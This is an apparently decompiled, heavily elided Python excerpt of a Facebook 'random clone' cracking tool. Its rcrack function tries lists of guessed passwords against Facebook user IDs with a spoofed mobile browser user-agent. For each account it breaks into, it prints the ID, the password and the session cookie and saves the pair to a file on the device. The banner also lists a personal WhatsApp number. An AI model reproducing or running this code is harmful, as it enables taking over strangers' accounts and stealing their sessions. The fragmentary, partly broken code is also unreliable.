...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100091453912376')
        return None
    if None == '3':
...
\033[1;32m │\33[37;41m\t     BD RENDOM CLONE VERSION 00-4     \33[0;m  │
 ...
 \033[1;32m┌────────────────────────────────────────────────┐
 \033[1;32m│\033[1;31m➣\033[1;91m DEVELOPMENT     \033[1;31m:\033[1;32m ZIHAD ISLAM
 \033[1;32m│\033[1;31m➣\033[1;32m FACEBOOK        \033[1;31m:\033[1;32m ZIHAD ISLAM 
 \033[1;32m│\033[1;31m➣\033[1;91m WHATSAPP        \033[1;31m:\033[1;32m 01875525411 
 \033[1;32m│\033[1;31m➣\033[1;32m GITHUB          \033[1;31m:\033[1;32m CYBER-31
 \033[1;32m└────────────────────────────────────────────────┘\n""")
...
def i():
    ...
    print('IDS SAVED IN CYBER-6-505-OK.txt, CYBER-6-CP.txt')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; 211033MI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
}
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\033[1;32mCYBER-6-OK ]' +uid+ ' | ' +ps+'\033[0;35m')
                print(f"{H}\033[0;35m[COOKIE] :\033[1;32m{coki}")
                cek_apk(session,coki)
                open('/sdcard/CYBER-6-OK.txt', 'a').write(uid+' | '+ps+'\n')
                oks.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s[CYBER-6] \033[1;32m[%s/%s] \033[1;32m[OK-%s] \r'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
